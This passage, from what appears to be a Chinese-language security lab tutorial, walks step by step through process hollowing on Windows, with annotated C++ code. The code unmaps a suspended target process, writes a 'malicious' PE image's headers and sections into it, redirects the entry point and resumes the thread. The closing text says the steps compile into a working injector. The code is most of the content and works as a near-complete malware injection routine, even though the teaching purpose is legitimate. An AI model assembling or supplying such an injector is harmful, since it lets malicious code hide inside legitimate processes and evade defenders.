+<span class="hljs-comment">//2. `PVOID pMaliciousImage = VirtualAlloc(NULL, maliciousFileSize, 0x3000, 0x04);`</span>
+<span class="hljs-comment">//使用 `VirtualAlloc` 函数为恶意映像文件分配虚拟内存空间。</span>
+<span class="hljs-comment">//- 第一个参数 `NULL` 表示让系统自动选择虚拟地址。</span>
+<span class="hljs-comment">//- 第二个参数 `maliciousFileSize` 是通过 `GetFileSize` 获取到的恶意映像文件的大小。</span>
+<span class="hljs-comment">//- 第三个参数 `0x3000` 是一组标志，表示同时保留和提交内存页 (`MEM_RESERVE | MEM_COMMIT`)。</span>
+<span class="hljs-comment">//- 第四个参数 `0x04` 是另一组标志，表示允许对内存的读/写访问权限 (`PAGE_READWRITE`)。</span>
+
+<span class="hljs-comment">//上述代码段的目的是使用`VirtualAlloc`函数并且根据恶意映像文件的大小(`maliciousFileSize`)为该恶意映像分配虚拟内存空间，`VirtualAlloc` 函数将返回已分配的内存块的起始地址给 `pMaliciousImage`；这个分配虚拟内存的过程将为后续操作提供可用的内存空间。</span></code></pre>
+<p>最后，将内存分配给本地进程之后，我们还必须进行内存写入，使用从前述步骤中获得的信息，我们可以使用<code>ReadFile</code>来针对本地进程内存执行写入操作：</p>
+<pre><code class="hljs c#">DWORD numberOfBytesRead; <span class="hljs-comment">// Stores number of bytes read 存储读取的字节数</span>
+
+<span class="hljs-keyword">if</span> (!ReadFile(
+	hMaliciousCode, <span class="hljs-comment">// Handle of malicious image 恶意映像的句柄</span>
+	pMaliciousImage, <span class="hljs-comment">// Allocated region of memory 已分配的内存区域</span>
+	maliciousFileSize, <span class="hljs-comment">// File size of malicious image 恶意映像的文件大小</span>
+	&amp;numberOfBytesRead, <span class="hljs-comment">// Number of bytes read 读取的字节数</span>
+	NULL
+	)) {
+	cout &lt;&lt; <span class="hljs-string">"[!] Unable to read Malicious file into memory. Error: "</span> &lt;&lt;GetLastError()&lt;&lt; endl;
+	TerminateProcess(target_pi-&gt;hProcess, <span class="hljs-number">0</span>);
+	<span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;
+}
+
+CloseHandle(hMaliciousCode);
+
+<span class="hljs-comment">//这段代码的主要功能是从指定的文件（通过`hMaliciousCode`句柄指定）中读取数据并写入到已分配的内存区域（通过`pMaliciousImage`指定）中，同时记录实际读取的字节数。</span>
+
+<span class="hljs-comment">//相关解释如下：</span>
+
+<span class="hljs-comment">//`DWORD numberOfBytesRead;`：声明一个 `DWORD` 类型的变量，用于存储实际读取的字节数；DWORD 是一个32位无符号整数类型，用于存储32位的字节数。</span>
+
+<span class="hljs-comment">//`ReadFile` 函数：尝试从指定文件中读取数据。</span>
+<span class="hljs-comment">// - `hMaliciousCode`：恶意映像的文件句柄。</span>
+<span class="hljs-comment">// - `pMaliciousImage`：已分配的内存区域，用于存储从文件中读取的数据。</span>
+<span class="hljs-comment">// - `maliciousFileSize`：文件大小，指定要读取的字节数。</span>
+<span class="hljs-comment">// - `&amp;numberOfBytesRead`：指向 `DWORD` 类型变量的指针，用于接收实际读取的字节数。</span>
+<span class="hljs-comment">// - `NULL`：该参数用于指定文件操作的一些特殊行为，在这个特定的代码段中，它被设置为 NULL，这表示从文件的开头开始读取数据，而不是从文件的特定位置开始读取。</span>
+
+<span class="hljs-comment">//`if (!ReadFile(...)){...}`：检查ReadFile函数的返回值，如果返回值为非零(表示读取成功)，则继续执行；如果ReadFile的返回值为零，表示读取失败，那么将输出错误信息，并终止目标进程。</span>
+<span class="hljs-comment">// - `cout &lt;&lt; "[!] Unable to read Malicious file into memory. Error: " &lt;&lt; GetLastError() &lt;&lt; endl;`：输出错误信息到标准输出，这条语句使用cout对象将错误信息输出到控制台；错误信息包括字符串 "[!] Unable to read Malicious file into memory. Error: " 和通过 GetLastError() 获取的具体错误代码。</span>
+<span class="hljs-comment">// - `TerminateProcess(target_pi-&gt;hProcess, 0);`：终止目标进程，这个函数调用用于立即终止 target_pi-&gt;hProcess 所代表的目标进程，参数 0 表示终止进程时不生成错误报告。</span>
+<span class="hljs-comment">// - `return 1;`：从当前函数中返回值 1，这是一个指示操作失败的标志(如果操作失败则返回错误码1)。</span>
+
+<span class="hljs-comment">//`CloseHandle(hMaliciousCode);`：关闭文件句柄，释放相关资源。</span>
+
+<span class="hljs-comment">//整体来说，这段代码的目的是将指定文件中的数据读取并写入到已分配的内存中，同时记录实际读取的字节数大小。</span>
+
+<span class="hljs-comment">//`ReadFile` 函数的原型如下：</span>
+<span class="hljs-comment">//BOOL ReadFile(</span>
+<span class="hljs-comment">//  HANDLE       hFile,</span>
+<span class="hljs-comment">//  LPVOID       lpBuffer,</span>
+<span class="hljs-comment">//  DWORD        nNumberOfBytesToRead,</span>
+<span class="hljs-comment">//  LPDWORD      lpNumberOfBytesRead,</span>
+<span class="hljs-comment">//  LPOVERLAPPED lpOverlapped</span>
+<span class="hljs-comment">//);</span>
+
+<span class="hljs-comment">//其中各个参数的含义如下：</span>
+<span class="hljs-comment">//- `hFile`: 文件句柄，指向要读取的文件、I/O 设备或管道。</span>
+<span class="hljs-comment">//- `lpBuffer`: 用于存储读取数据的缓冲区的指针。</span>
+<span class="hljs-comment">//- `nNumberOfBytesToRead`: 指定要读取的字节数。</span>
+<span class="hljs-comment">//- `lpNumberOfBytesRead`: 指向一个 `DWORD` 类型变量的指针，用于存储实际读取的字节数；如果为 `NULL`，则表示不获取实际读取的字节数。</span>
+<span class="hljs-comment">//- `lpOverlapped`: 指向一个`OVERLAPPED`结构的指针，OVERLAPPED结构包含了异步操作的信息；如果在同步操作中使用，默认可以将此参数值设置为 `NULL`。</span>
+
+<span class="hljs-comment">//`ReadFile`函数的返回值是一个布尔值，如果函数成功，则返回非零值，如果函数失败，则返回零，可以使用 `GetLastError` 函数来获取详细的相关错误信息。</span>
+<span class="hljs-comment">//`ReadFile`函数可以用于同步和异步操作：如果在同步操作中使用，lpOverlapped可以设置为NULL，表示使用默认的同步方式执行文件读取操作；而在异步操作中，需要传递一个填充了OVERLAPPED结构的指针(即传递一个指向OVERLAPPED结构并已经设置了相应字段值的指针)，以支持异步 I/O 操作。</span>
+
+
+<span class="hljs-comment">//`OVERLAPPED` 结构是用于支持异步 I/O 操作的 Windows API 结构。它的定义如下：</span>
+<span class="hljs-comment">//typedef struct _OVERLAPPED {</span>
+<span class="hljs-comment">//  ULONG_PTR Internal;</span>
+<span class="hljs-comment">//  ULONG_PTR InternalHigh;</span>
+<span class="hljs-comment">//  DWORD     Offset;</span>
+<span class="hljs-comment">//  DWORD     OffsetHigh;</span>
+<span class="hljs-comment">//  HANDLE    hEvent;</span>
+<span class="hljs-comment">//} OVERLAPPED, *LPOVERLAPPED;</span>
+
+<span class="hljs-comment">//这个结构包含以下成员：</span>
+<span class="hljs-comment">//- `Internal` 和 `InternalHigh`: 用于存储系统特定的信息，通常用于内核通信。</span>
+<span class="hljs-comment">//- `Offset` 和 `OffsetHigh`: 用于指定文件指针的偏移，这两个成员合并起来形成一个64位的文件指针。</span>
+<span class="hljs-comment">//- `hEvent`: 一个事件对象的句柄，用于在异步操作完成时通知应用程序。</span>
+
+<span class="hljs-comment">//当使用`ReadFile`或其他异步I/O函数时，可以通过传递一个指向OVERLAPPED结构并已经设置了相应字段值的指针，来实现在后台进行文件读取操作而不阻塞主线程。</span>
+<span class="hljs-comment">//异步I/O允许应用程序在等待 I/O 操作完成的同时执行其他任务；而在同步操作中，`lpOverlapped` 参数通常可设置为 `NULL`，以使用默认的同步方式执行文件操作。</span></code></pre>
+<p>在进程镂空的第三步中，我们的目标进程必须通过取消内存映射来实现被“镂空”。在取消内存映射之前，我们必须确定API调用的参数，我们需要确定进程在内存中的位置和入口点，而CPU寄存器<code>EAX</code>(入口点)和<code>EBX</code>(PEB位置)包含我们需要获取的信息，这些信息可以通过使用<code>GetThreadContext</code>找到。在我们找到刚才提及的两个寄存器之后，就可以使用<code>ReadProcessMemory</code>来从指定的地址中读取数据，这个地址是通过检查PEB(进程环境块)并应用偏移量(<code>0x8</code>)得到的，其中指向PEB的指针被存储在寄存器<code>EBX</code>中。</p>
+<p>tips：PEB(进程环境块-Process Environment Block)是一个结构，包含了许多关于进程的信息，包括进程的基地址，而&nbsp;<code>0x8</code>&nbsp;是一个特定的偏移量，对应于PEB 结构中的某个字段，这个具体的偏移量是根据系统架构和操作系统版本而定的，对于 32 位 Windows 操作系统而言，通常PEB结构中的ImageBaseAddress字段的偏移量是&nbsp;<code>8</code>。</p>
+<pre><code class="hljs c#"><span class="hljs-comment">//这里的c是一个 CONTEXT 类型的变量，在本小节上文代码中已经声明过了。</span>
+<span class="hljs-comment">//既然c被声明为一个 CONTEXT 类型的变量，那么&amp;c就是一个指向CONTEXT类型结构的指针。</span>
+c.ContextFlags = CONTEXT_INTEGER; <span class="hljs-comment">// Only stores CPU registers in the pointer 表示仅存储CPU寄存器</span>
+GetThreadContext(
+	target_pi-&gt;hThread, <span class="hljs-comment">// 从 PROCESS_INFORMATION 结构中获得的线程句柄</span>
+	&amp;c <span class="hljs-comment">// Pointer to store retrieved context  指向存储检索到的上下文的指针</span>
+); <span class="hljs-comment">// Obtains the current thread context 获取当前线程上下文(GetThreadContext函数的作用)</span>
+
+<span class="hljs-comment">//上面这部分代码用于获取线程上下文信息。</span>
+<span class="hljs-comment">//首先，这部分代码设置了CONTEXT_INTEGER标志，它告诉GetThreadContext函数只获取整数寄存器的上下文信息。</span>
+<span class="hljs-comment">//然后，调用 GetThreadContext 函数，将线程句柄 target_pi-&gt;hThread 关联的线程的上下文信息存储在c中(在本小节的上文部分代码中已经定义了c)，这个上下文信息包括了寄存器的状态，而在这里我们主要关心EBX寄存器中的值。</span>
+
+PVOID pTargetImageBaseAddress; 
+ReadProcessMemory(
+	target_pi-&gt;hProcess,<span class="hljs-comment">//从 PROCESS_INFORMATION 结构体中获得的进程句柄</span>
+	(PVOID)(c.Ebx + <span class="hljs-number">8</span>),<span class="hljs-comment">//指向基地址的指针，在指向PEB的指针(存储在寄存器EBX中)上加偏移量，可得到ImageBaseAddress字段的地址，从而获取到目标进程的基地址</span>
+	&amp;pTargetImageBaseAddress, <span class="hljs-comment">// Store target base address 存储目标基地址</span>
+	<span class="hljs-keyword">sizeof</span>(PVOID), <span class="hljs-comment">// Bytes to read 要读取的字节数</span>
+	<span class="hljs-number">0</span> <span class="hljs-comment">// Number of bytes out 输出实际读取的字节数，此处设置为 0 实际上是在告诉函数，即使成功执行读取操作，也不需要返回实际读取的字节数</span>
+);
+
+<span class="hljs-comment">//上面这部分代码将读取目标进程的内存。</span>
+<span class="hljs-comment">//这部分代码使用 ReadProcessMemory 函数，从目标进程的内存中读取数据。</span>
+<span class="hljs-comment">//具体地，它从地址 (c.Ebx + 8) 处读取了 sizeof(PVOID) 字节的数据，并将这些数据存储在pTargetImageBaseAddress指针所指向的内存位置。</span>
+<span class="hljs-comment">//(c.Ebx + 8) 是通过在指向 PEB 的指针上加上偏移量 8 得到的，而 &amp;pTargetImageBaseAddress 则用于实现对目标进程的基地址的存储。</span>
+<span class="hljs-comment">//pTargetImageBaseAddress实际上是一个指向存储目标进程基地址信息的内存位置的指针，通过这个指针，我们可以在后续的代码中访问 pTargetImageBaseAddress 变量，从而获取目标进程的基地址信息。</span>
+
+<span class="hljs-comment">//总体来说，上面的整体代码段的作用是为了获取目标进程的基地址，以便后续进行一些内存操作或注入操作。</span></code></pre>
+<p>存储完基址后，我们可以开始取消内存映射了，我们可以使用从 ntdll.dll 导入的&nbsp;<code>ZwUnmapViewOfSection</code>来释放目标进程的内存。</p>
+<pre><code class="hljs c#">HMODULE hNtdllBase = GetModuleHandleA(<span class="hljs-string">"ntdll.dll"</span>); <span class="hljs-comment">// Obtains the handle for ntdll 获取ntdll的句柄</span>
+pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(
+	hNtdllBase, <span class="hljs-comment">//ntdll的句柄</span>
+	<span class="hljs-string">"ZwUnmapViewOfSection"</span> <span class="hljs-comment">// API call to obtain 获取到的API调用名称</span>
+); <span class="hljs-comment">// Obtains ZwUnmapViewOfSection from ntdll 从ntdll中获取ZwUnmapViewOfSection，pZwUnmapViewOfSection是一个函数指针(指向某函数)。</span>
+
+DWORD dwResult = pZwUnmapViewOfSection(    <span class="hljs-comment">//此处使用NTSTATUS类型会比使用DWORD类型更加准确</span>
+	target_pi-&gt;hProcess, <span class="hljs-comment">//从PROCESS_INFORMATION结构体中获得的进程句柄</span>
+	pTargetImageBaseAddress <span class="hljs-comment">// Base address of the process 进程的基址</span>
+);
+
+<span class="hljs-comment">//这段代码的主要作用是使用动态链接库（DLL）的方式调用 `ZwUnmapViewOfSection` 函数，并使用该函数来释放目标进程的虚拟内存空间，从而取消内存映射。</span>
+<span class="hljs-comment">//以下是相关的解释：</span>
+<span class="hljs-comment">//1. `HMODULE hNtdllBase = GetModuleHandleA("ntdll.dll");`</span>
+<span class="hljs-comment">//获取 `ntdll.dll` 模块的句柄，`ntdll.dll` 是包含了许多Windows内部函数的动态链接库，包括 `ZwUnmapViewOfSection`。</span>
+
+<span class="hljs-comment">//2. `pfnZwUnmapViewOfSection pZwUnmapViewOfSection = (pfnZwUnmapViewOfSection)GetProcAddress(hNtdllBase, "ZwUnmapViewOfSection");`</span>
+<span class="hljs-comment">//获取 `ntdll.dll` 模块中 `ZwUnmapViewOfSection` 函数的地址，这里使用 `GetProcAddress` 函数动态获取函数地址，以便后续调用。</span>
+
+<span class="hljs-comment">//3. `DWORD dwResult = pZwUnmapViewOfSection(target_pi-&gt;hProcess, pTargetImageBaseAddress);`</span>
+<span class="hljs-comment">//使用获取到的 `ZwUnmapViewOfSection` 函数地址，调用该函数，从而取消目标进程中以 `pTargetImageBaseAddress` 为基地址的虚拟内存区域的映射。</span>
+<span class="hljs-comment">//此处将使用pZwUnmapViewOfSection函数指针来实现对于函数ZwUnmapViewOfSection的调用。</span>
+<span class="hljs-comment">//`target_pi-&gt;hProcess` 是目标进程的句柄，`pTargetImageBaseAddress` 是虚拟内存的基地址。</span>
+
+<span class="hljs-comment">//这段代码的目的是通过动态链接库调用 `ZwUnmapViewOfSection` 函数来释放目标进程的虚拟内存空间，从而实现取消内存映射的操作。</span>
+<span class="hljs-comment">//注意，使用Windows内部函数和API进行操作时需要谨慎，因为这可能会导致系统不稳定，而且相关的代码可能会受到不同的Windows版本影响。</span></code></pre>
+<p>在进程镂空的第四步中，我们首先应该在已经被镂空的进程中为恶意映像分配内存，我们可以使用<code>VirtualAlloc</code>来分配内存。此时我们需要获取在文件头中找到的映像大小，<code>e_lfanew</code>可以被用于确认从DOS头到PE头的字节数，一旦到达PE头，我们就可以从可选标头(Optional header)中获取到<code>SizeOfImage</code>。</p>
+<pre><code class="hljs c#">PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;<span class="hljs-comment">//从恶意映像中获取DOS头</span>
+PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew);<span class="hljs-comment">//通过e_lfanew获取NT标头，NT标头（NT Header）是PE文件头的开始部分，在PE文件中，NT标头紧随DOS头之后，它标志着PE文件的起始位置。</span>
+
+DWORD sizeOfMaliciousImage = pNTHeaders-&gt;OptionalHeader.SizeOfImage; <span class="hljs-comment">//从NT标头结构中获取可选标头的SizeOfImage字段</span>
+
+PVOID pHollowAddress = VirtualAllocEx(
+	target_pi-&gt;hProcess, <span class="hljs-comment">// Handle of the process obtained from the PROCESS_INFORMATION structure</span>
+	pTargetImageBaseAddress, <span class="hljs-comment">// Base address of the process</span>
+	sizeOfMaliciousImage, <span class="hljs-comment">// Byte size obtained from optional header</span>
+	<span class="hljs-number">0x3000</span>, <span class="hljs-comment">// Reserves and commits pages (MEM_RESERVE | MEM_COMMIT)</span>
+	<span class="hljs-number">0x40</span> <span class="hljs-comment">// Enabled execute and read/write access (PAGE_EXECUTE_READWRITE)</span>
+);
+
+<span class="hljs-comment">//这段代码主要用于在目标进程中分配内存，以便用于恶意映像替换。</span>
+
+<span class="hljs-comment">//1. 获取DOS头和NT头：</span>
+<span class="hljs-comment">//   PIMAGE_DOS_HEADER pDOSHeader = (PIMAGE_DOS_HEADER)pMaliciousImage;</span>
+<span class="hljs-comment">//   这一行代码将 `pMaliciousImage` 转换为 `PIMAGE_DOS_HEADER` 类型的指针，以获取指向DOS头的指针。</span>
+
+<span class="hljs-comment">//   PIMAGE_NT_HEADERS pNTHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew);</span>
+<span class="hljs-comment">//   这一行代码使用DOS头中的 `e_lfanew` 字段获取NT头的偏移量，然后将 `pMaliciousImage` 的字节指针加上这个偏移量，得到指向NT头的指针。</span>
+
+<span class="hljs-comment">//2. 获取恶意映像的大小：</span>
+<span class="hljs-comment">//   DWORD sizeOfMaliciousImage = pNTHeaders-&gt;OptionalHeader.SizeOfImage;</span>
+<span class="hljs-comment">//   通过访问NT头中的 `OptionalHeader` 结构，获取恶意映像的大小信息，并将该信息存储在 `sizeOfMaliciousImage` 变量中。</span>
+
+<span class="hljs-comment">//3. 在目标进程中为恶意映像分配内存：</span>
+<span class="hljs-comment">//   PVOID pHollowAddress = VirtualAllocEx(</span>
+<span class="hljs-comment">//      target_pi-&gt;hProcess,        // 目标进程的句柄，从 PROCESS_INFORMATION 结构中获取</span>
+<span class="hljs-comment">//      pTargetImageBaseAddress,    // 进程的基地址</span>
+<span class="hljs-comment">//      sizeOfMaliciousImage,       // 从可选头中获取的字节大小</span>
+<span class="hljs-comment">//      0x3000,                      // 保留并提交内存页面（MEM_RESERVE | MEM_COMMIT）</span>
+<span class="hljs-comment">//      0x40                        // 启用执行和读写权限（PAGE_EXECUTE_READWRITE）</span>
+<span class="hljs-comment">//   );</span>
+<span class="hljs-comment">//   使用 `VirtualAllocEx` 函数在目标进程中分配内存，`pHollowAddress` 变量将存储已分配的内存的基地址。</span>
+
+<span class="hljs-comment">//总体而言，这段代码用于获取恶意映像的大小，并在目标进程中分配足够的内存以便用于恶意映像替换。</span></code></pre>
+<p>一旦分配好了内存，我们就可以将恶意文件写入到目标进程的内存中，因为我们正在写入文件，所以我们必须先写PE头，然后再写PE节。为了向目标进程的内存中写入PE头，我们可以使用<code>WriteProcessMemory</code>以及标头的大小来确定在何处停止写入。</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">if</span> (!WriteProcessMemory( 
+	target_pi-&gt;hProcess, <span class="hljs-comment">// 从PROCESS_INFORMATION结构中获得的进程句柄</span>
+	pTargetImageBaseAddress, <span class="hljs-comment">// Base address of the process 进程的基地址</span>
+	pMaliciousImage, <span class="hljs-comment">// Local memory where the malicious file resides 恶意文件所在的本地内存</span>
+	pNTHeaders-&gt;OptionalHeader.SizeOfHeaders, <span class="hljs-comment">// Byte size of PE headers PE标头的总字节大小</span>
+	NULL
+)) {
+	cout&lt;&lt; <span class="hljs-string">"[!] Writting Headers failed. Error: "</span> &lt;&lt; GetLastError() &lt;&lt; endl;
+}
+
+<span class="hljs-comment">//这段代码使用了Windows API函数`WriteProcessMemory`，用于将PE（可移植可执行）文件的标头写入目标进程。</span>
+
+<span class="hljs-comment">//让我们逐个分析`WriteProcessMemory`函数调用的参数：</span>
+
+<span class="hljs-comment">//1. `target_pi-&gt;hProcess`：这是从`PROCESS_INFORMATION`结构中获取的指向目标进程的句柄，它表示将要写入内存的目标进程。</span>
+
+<span class="hljs-comment">//2. `pTargetImageBaseAddress`：这是目标进程中数据将被写入的基址，通常是目标进程中PE映像的基址。</span>
+
+<span class="hljs-comment">//3. `pMaliciousImage`：此参数表示恶意文件所在的本地内存，这是将要从中复制数据以便写入到目标进程内存的源缓冲区。</span>
+
+<span class="hljs-comment">//4. `pNTHeaders-&gt;OptionalHeader.SizeOfHeaders`：这是PE标头的字节大小，它指定了要从源缓冲区（`pMaliciousImage`）写入到目标进程内存的字节数。</span>
+
+<span class="hljs-comment">//5. `NULL`：最后一个参数表示实际写入的字节数，由于设置为`NULL`，在函数返回将不提供相关信息。</span>
+
+<span class="hljs-comment">//`if`语句将检查`WriteProcessMemory`函数的返回值，如果返回false（表示失败），则使用`GetLastError()`获取与失败相关联的错误代码，并打印错误消息。</span>
+
+<span class="hljs-comment">//总的来说，这段代码尝试将PE文件的头部从本地内存（`pMaliciousImage`）写入到目标进程中的指定内存位置。如果操作失败，将打印错误消息。</span>
+<span class="hljs-comment">//请注意，此类代码片段通常出现在与进程注入或代码注入技术相关的代码中，这经常被恶意软件用于恶意目的。</span></code></pre>
+<p>现在我们需要继续向目标进程的内存中写入每个PE节，我们可以使用NT标头中的<code>NumberOfSections</code>字段来查找PE节的数量，并且根据<code>e_lfanew</code>和当前标头的大小来通过循环遍历写入每个恶意的PE节。</p>
+<pre><code class="hljs c#"><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; pNTHeaders-&gt;FileHeader.NumberOfSections; i++) {<span class="hljs-comment">//基于PE数据中节数的循环</span>
+	PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew + <span class="hljs-keyword">sizeof</span>(IMAGE_NT_HEADERS) + (i * <span class="hljs-keyword">sizeof</span>(IMAGE_SECTION_HEADER)));<span class="hljs-comment">//确定当前的PE节标头</span>
+
+	WriteProcessMemory(
+		target_pi-&gt;hProcess, <span class="hljs-comment">//从PROCESS_INFORMATION结构中获得的进程句柄</span>
+		(PVOID)((LPBYTE)pHollowAddress + pSectionHeader-&gt;VirtualAddress),<span class="hljs-comment">//目标进程的内存空间中用于放置(循环中)当前PE节的基址</span>
+		(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader-&gt;PointerToRawData),<span class="hljs-comment">//指向(循环中)当前PE节内容的指针</span>
+		pSectionHeader-&gt;SizeOfRawData, <span class="hljs-comment">//(循环中)当前PE节的字节大小</span>
+		NULL
+	);
+}
+
+<span class="hljs-comment">//这段代码通过循环遍历恶意PE文件的各个节（sections），并使用`WriteProcessMemory`函数将每个节的内容写入到目标进程的指定位置，让我们逐步分析代码：</span>
+
+<span class="hljs-comment">//1. `for (int i = 0; i &lt; pNTHeaders-&gt;FileHeader.NumberOfSections; i++)`</span>
+<span class="hljs-comment">//这是一个`for`循环，从0开始，循环次数为PE文件头中记录的节的数量（`NumberOfSections`），这个循环将遍历PE文件中的所有节。</span>
+
+
+<span class="hljs-comment">//2. `PIMAGE_SECTION_HEADER pSectionHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)pMaliciousImage + pDOSHeader-&gt;e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));`</span>
+<span class="hljs-comment">//这段代码主要是用于获取PE文件中第 i 个节（Section）的标头信息，让我们逐步解析这段代码：</span>
+<span class="hljs-comment">//   - `(LPBYTE)pMaliciousImage`：pMaliciousImage 是指向恶意PE文件在本地内存中的起始位置的指针，强制转换类型为LPBYTE，表示这个指针是指向字节数据的。</span>
+
+<span class="hljs-comment">//   - `pDOSHeader-&gt;e_lfanew`：pDOSHeader是指向DOS头（DOS Header）的指针，e_lfanew是DOS头中的一个字段，表示NT头（PE Signature）的偏移量，这个值告诉操作系统在文件中找到NT头的位置。</span>
+
+<span class="hljs-comment">//   - `sizeof(IMAGE_NT_HEADERS)`：IMAGE_NT_HEADERS结构体存储了PE文件的NT头信息，加上这个值是为了跳过NT头，从而到达恶意PE文件中的第一个节标头。</span>
+
+<span class="hljs-comment">//   - `(i * sizeof(IMAGE_SECTION_HEADER))`：i乘以sizeof(IMAGE_SECTION_HEADER)是为了移动到特定索引i处的节标头位置，sizeof(IMAGE_SECTION_HEADER)表示一个PE节标头的大小。</span>
+
+<span class="hljs-comment">//   - `(PIMAGE_SECTION_HEADER) pSectionHeader`：最终，整个表达式的结果将被强制转换为PIMAGE_SECTION_HEADER类型，这表示取得的指针将指向一个IMAGE_SECTION_HEADER结构体，即指向第 i 个PE节的标头。</span>
+
+
+<span class="hljs-comment">//3. `WriteProcessMemory(target_pi-&gt;hProcess, (PVOID)((LPBYTE)pHollowAddress + pSectionHeader-&gt;VirtualAddress), (PVOID)((LPBYTE)pMaliciousImage + pSectionHeader-&gt;PointerToRawData), pSectionHeader-&gt;SizeOfRawData, NULL);`</span>
+<span class="hljs-comment">//在循环体内，使用`WriteProcessMemory`函数将源PE文件中的一个节的内容写入到目标进程的指定地址，让我们逐步解析这段代码：</span>
+<span class="hljs-comment">//   - `target_pi-&gt;hProcess`：这是目标进程的句柄，表示将要写入数据的目标进程。</span>
+
+<span class="hljs-comment">//   - `(PVOID)((LPBYTE)pHollowAddress + pSectionHeader-&gt;VirtualAddress)`：这是目标进程中用于放置(循环中)当前PE节的基地址。</span>
+<span class="hljs-comment">//`pHollowAddress`存储的是目标进程中用于放置将要注入的恶意PE文件的空间的基地址，`pSectionHeader-&gt;VirtualAddress`表示源PE文件中当前PE节的虚拟地址，通过加上pHollowAddress就可以确定(循环中)当前源PE节将要被写入到目标进程中的什么位置。</span>
+
+<span class="hljs-comment">//   - `(PVOID)((LPBYTE)pMaliciousImage + pSectionHeader-&gt;PointerToRawData)`：这是源PE文件中指向(循环中)当前PE节的内容的指针。</span>
+<span class="hljs-comment">//pMaliciousImage是源PE文件在本地内存中的起始位置，pSectionHeader-&gt;PointerToRawData表示(循环中)当前PE节在源PE文件中的偏移量，通过这两者相加，可以确定将要写入的(循环中)当前PE节的来源位置。</span>
+
+<span class="hljs-comment">//   - `pSectionHeader-&gt;SizeOfRawData`：这是当前节在源PE文件中的大小，以字节为单位，它表示要从源PE文件中写入到目标进程中的字节数。</span>
+
+<span class="hljs-comment">//总体而言，这段代码的作用是将源PE文件(恶意PE文件)中的各个节的内容通过`WriteProcessMemory`函数注入到目标进程的指定位置。这是一种典型的进程注入技术，用于将恶意代码或其他可执行代码加载到目标进程的内存中。</span>
+
+
+<span class="hljs-comment">//在Windows API中，`WriteProcessMemory` 函数的声明如下：</span>
+
+<span class="hljs-comment">//BOOL WriteProcessMemory(</span>
+<span class="hljs-comment">//  HANDLE  hProcess,</span>
+<span class="hljs-comment">//  LPVOID  lpBaseAddress,</span>
+<span class="hljs-comment">//  LPCVOID lpBuffer,</span>
+<span class="hljs-comment">//  SIZE_T  nSize,</span>
+<span class="hljs-comment">//  SIZE_T  *lpNumberOfBytesWritten</span>
+<span class="hljs-comment">//);</span>
+
+<span class="hljs-comment">//以下是关于函数的各个参数的简要说明：</span>
+
+<span class="hljs-comment">//- `hProcess`: 目标进程的句柄，表示要写入数据的进程。</span>
+
+<span class="hljs-comment">//- `lpBaseAddress`: 要写入数据的目标进程中的起始地址。</span>
+
+<span class="hljs-comment">//- `lpBuffer`: 要写入到目标进程的源数据的指针。</span>
+
+<span class="hljs-comment">//- `nSize`: 要写入的数据的字节数。</span>
+
+<span class="hljs-comment">//- `lpNumberOfBytesWritten`: 一个可选的指针，用于接收实际写入的字节数，为 `NULL`时表示不关心实际写入的字节数。</span>
+
+<span class="hljs-comment">//返回值：</span>
+<span class="hljs-comment">//- 如果函数执行成功，返回非零值；如果函数执行失败，则返回零，同时还可以通过调用 `GetLastError` 函数来获取更多的错误信息。</span></code></pre>
+<p>此外，我们也可以使用重定位表(relocation tables)来将文件数据写入目标内存，这将在本文的第六小节中进行更深入的讨论。</p>
+<p>在进程镂空的第五步中，我们可以使用<code>SetThreadContext</code>来更改<code>EAX</code>以设置指向恶意代码的入口点。</p>
+<pre><code class="hljs c#">c.Eax = (SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint); <span class="hljs-comment">//将上下文结构(CONTEXT)指针设置为指向(恶意的)PE可选标头中的入口点</span>
+
+<span class="hljs-comment">//pHollowAddress 是目标进程中用于放置将要注入的恶意PE数据的内存空间的基地址</span>
+<span class="hljs-comment">//(LPBYTE)pHollowAddress 表示将pHollowAddress转换为LPBYTE类型，即得到一个字节型指针，这是因为我们希望以字节为单位进行地址偏移。</span>
+
+<span class="hljs-comment">//pNTHeaders 是一个指向目标进程中PE头部信息(NT标头,它是PE文件头的开始部分)的指针。</span>
+<span class="hljs-comment">//AddressOfEntryPoint 是在PE文件头部的Optional Header中的一个字段。</span>
+<span class="hljs-comment">//pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint 将获取PE标头的Optional Header中的入口点相对于PE文件起始位置的偏移量。</span>
+
+<span class="hljs-comment">//(SIZE_T)((LPBYTE)pHollowAddress + pNTHeaders-&gt;OptionalHeader.AddressOfEntryPoint);</span>
+<span class="hljs-comment">//将字节型指针 ((LPBYTE)pHollowAddress) 与偏移量相加，然后将结果转换为 SIZE_T 类型，这将得出目标进程中恶意代码的入口点的实际地址</span>
+
+SetThreadContext(
+	target_pi-&gt;hThread, <span class="hljs-comment">//从PROCESS_INFORMATION结构中获得的线程句柄</span>
+	&amp;c <span class="hljs-comment">//指向已存储的线程上下文结构的指针</span>
+);</code></pre>
+<p>在进程镂空的第六步中，我们需要使用<code>ResumeThread</code>来使目标进程脱离挂起状态。</p>
+<pre><code class="hljs c#">ResumeThread(
+	target_pi-&gt;hThread <span class="hljs-comment">//从PROCESS_INFORMATION结构中获得的线程句柄</span>
+);</code></pre>
+<p>我们可以将上述这些步骤编译在一起来创建一个进程镂空注入器，并使用由本文实验环境所提供的 C++ 注入器来进行进程镂空实验。</p>
